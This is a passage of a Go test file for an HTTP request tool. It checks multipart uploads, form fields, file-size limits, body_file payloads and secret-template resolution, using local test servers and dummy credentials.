		t.Errorf("expected 2 files, got %d", len(receivedFiles))
	}
	if string(receivedFiles["file1"].Content) != "file-a" {
		t.Errorf("file1 content = %q", string(receivedFiles["file1"].Content))
	}
	if string(receivedFiles["file2"].Content) != "file-b" {
		t.Errorf("file2 content = %q", string(receivedFiles["file2"].Content))
	}
}

func TestHTTPRequestMultipartBodyAndFilesConflict(t *testing.T) {
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)

	// body + files
	params, _ := json.Marshal(map[string]interface{}{
		"url":    "http://example.com",
		"method": "POST",
		"body":   "some body",
		"files": []map[string]string{
			{"field_name": "f", "file_path": "/tmp/x"},
		},
	})
	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for body + files")
	}
	if !strings.Contains(err.Error(), "mutually exclusive") {
		t.Errorf("error = %v", err)
	}
}

func TestHTTPRequestMultipartFileMissing(t *testing.T) {
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":    "http://example.com",
		"method": "POST",
		"files": []map[string]string{
			{"field_name": "doc", "file_path": "/nonexistent/file.txt"},
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for missing file")
	}
	if !strings.Contains(err.Error(), "nonexistent") {
		t.Errorf("error = %v", err)
	}
}

func TestHTTPRequestMultipartFileTooLarge(t *testing.T) {
	// Create a file that reports > 50MB via stat
	// We can't easily make a real 50MB file in tests, so test the buildMultipartBody directly
	dir := t.TempDir()
	largePath := filepath.Join(dir, "large.bin")

	// Create a sparse file that's 51MB
	f, err := os.Create(largePath)
	if err != nil {
		t.Fatal(err)
	}
	f.Truncate(51 * 1024 * 1024)
	f.Close()

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":    "http://example.com",
		"method": "POST",
		"files": []map[string]string{
			{"field_name": "doc", "file_path": largePath},
		},
	})

	_, err = tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for oversized file")
	}
	if !strings.Contains(err.Error(), "50MB") {
		t.Errorf("error = %v", err)
	}
}

func TestHTTPRequestMultipartFormFieldsSecrets(t *testing.T) {
	var receivedFields map[string]string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedFields, _ = parseMultipartRequest(t, r)
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer srv.Close()

	store := writeTestSecrets(t, fmt.Sprintf(`
[custom]
bot_token = "secret-bot-token-123"
allowed_hosts = ["%s"]
`, srv.Listener.Addr().(*net.TCPAddr).IP.String()))

	tmpFile := filepath.Join(t.TempDir(), "doc.pdf")
	os.WriteFile(tmpFile, []byte("pdf-content"), 0644)

	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":    srv.URL,
		"method": "POST",
		"files": []map[string]string{
			{"field_name": "document", "file_path": tmpFile},
		},
		"form_fields": map[string]string{
			"chat_id": "12345",
			"token":   "{{secret:custom.bot_token}}",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if receivedFields["token"] != "secret-bot-token-123" {
		t.Errorf("token = %q, want resolved secret", receivedFields["token"])
	}
	if receivedFields["chat_id"] != "12345" {
		t.Errorf("chat_id = %q", receivedFields["chat_id"])
	}
}

func TestHTTPRequestMultipartFilenameOverride(t *testing.T) {
	var receivedFiles map[string]struct {
		Filename string
		Content  []byte
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, receivedFiles = parseMultipartRequest(t, r)
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer srv.Close()

	tmpFile := filepath.Join(t.TempDir(), "ugly-temp-name-123.bin")
	os.WriteFile(tmpFile, []byte("data"), 0644)

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":    srv.URL,
		"method": "POST",
		"files": []map[string]string{
			{"field_name": "file", "file_path": tmpFile, "filename": "pretty-name.pdf"},
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if f, ok := receivedFiles["file"]; !ok {
		t.Error("expected file part")
	} else if f.Filename != "pretty-name.pdf" {
		t.Errorf("filename = %q, want pretty-name.pdf", f.Filename)
	}
}

func TestHTTPRequestFormFieldsWithoutFiles(t *testing.T) {
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":    "http://example.com",
		"method": "POST",
		"form_fields": map[string]string{
			"key": "value",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for form_fields without files")
	}
	if !strings.Contains(err.Error(), "form_fields requires files") {
		t.Errorf("error = %v", err)
	}
}

func TestHTTPRequestMultipartCustomSizeLimit(t *testing.T) {
	// Set a small custom limit (1KB) and verify it's enforced
	dir := t.TempDir()
	filePath := filepath.Join(dir, "small.bin")
	os.WriteFile(filePath, make([]byte, 2*1024), 0644) // 2KB file

	// With a 1KB limit, this should fail
	tool := NewHTTPRequestTool(nil, nil, "", 0, 1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":    "http://example.com",
		"method": "POST",
		"files": []map[string]string{
			{"field_name": "doc", "file_path": filePath},
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for file exceeding custom limit")
	}
	if !strings.Contains(err.Error(), "exceeds") {
		t.Errorf("error = %v", err)
	}
}

func TestHTTPRequestMultipartCustomSizeLimitAllows(t *testing.T) {
	// Set a 100MB limit — the file (2KB) should be accepted
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer srv.Close()

	dir := t.TempDir()
	filePath := filepath.Join(dir, "small.bin")
	os.WriteFile(filePath, []byte("data"), 0644)

	tool := NewHTTPRequestTool(nil, nil, "", 0, 100*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":    srv.URL,
		"method": "POST",
		"files": []map[string]string{
			{"field_name": "doc", "file_path": filePath},
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !strings.Contains(result.Text,"HTTP 200") {
		t.Errorf("expected HTTP 200: %s", result.Text)
	}
}

// --- body_file tests ---

func TestHTTPRequestBodyFile(t *testing.T) {
	var receivedBody string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		data, _ := io.ReadAll(r.Body)
		receivedBody = string(data)
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer srv.Close()

	bodyPath := filepath.Join(t.TempDir(), "payload.json")
	os.WriteFile(bodyPath, []byte(`{"audio":"base64data","model":"whisper"}`), 0644)

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":       srv.URL,
		"method":    "POST",
		"body_file": bodyPath,
		"headers":   map[string]string{"Content-Type": "application/json"},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !strings.Contains(result.Text,"HTTP 200") {
		t.Errorf("expected HTTP 200: %s", result.Text)
	}
	if receivedBody != `{"audio":"base64data","model":"whisper"}` {
		t.Errorf("server received body = %q", receivedBody)
	}
}

func TestHTTPRequestBodyFileWithSecrets(t *testing.T) {
	var receivedBody string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		data, _ := io.ReadAll(r.Body)
		receivedBody = string(data)
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer srv.Close()

	store := writeTestSecrets(t, fmt.Sprintf(`
[custom]
api_key = "resolved-secret-key"
allowed_hosts = ["%s"]
`, srv.Listener.Addr().(*net.TCPAddr).IP.String()))

	bodyPath := filepath.Join(t.TempDir(), "payload.json")
	os.WriteFile(bodyPath, []byte(`{"key":"{{secret:custom.api_key}}","data":"hello"}`), 0644)

	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":       srv.URL,
		"method":    "POST",
		"body_file": bodyPath,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !strings.Contains(receivedBody, "resolved-secret-key") {
		t.Errorf("secret not resolved in body_file: %q", receivedBody)
	}
	if strings.Contains(receivedBody, "{{secret:") {
		t.Error("unresolved secret template in body")
	}
}

func TestHTTPRequestBodyFileNotFound(t *testing.T) {
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":       "http://example.com",
		"method":    "POST",
		"body_file": "/nonexistent/payload.json",
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for missing body_file")
	}
	if !strings.Contains(err.Error(), "body_file") {
		t.Errorf("error = %v", err)
	}
}

func TestHTTPRequestBodyFileMutualExclusionWithBody(t *testing.T) {
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":       "http://example.com",
		"method":    "POST",
		"body":      "inline body",
		"body_file": "/tmp/some-file.json",
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for body + body_file")
	}
	if !strings.Contains(err.Error(), "mutually exclusive") {
		t.Errorf("error = %v", err)
	}
}

func TestHTTPRequestBodyFileMutualExclusionWithFiles(t *testing.T) {
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":       "http://example.com",
		"method":    "POST",
		"body_file": "/tmp/some-file.json",
		"files": []map[string]string{
			{"field_name": "doc", "file_path": "/tmp/x"},
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for body_file + files")
	}
	if !strings.Contains(err.Error(), "mutually exclusive") {
		t.Errorf("error = %v", err)
	}
}

func TestHTTPRequestBodyFileIsDirectory(t *testing.T) {
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":       "http://example.com",
		"method":    "POST",
		"body_file": t.TempDir(),
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for directory body_file")
	}
	if !strings.Contains(err.Error(), "directory") {
		t.Errorf("error = %v", err)
	}
}
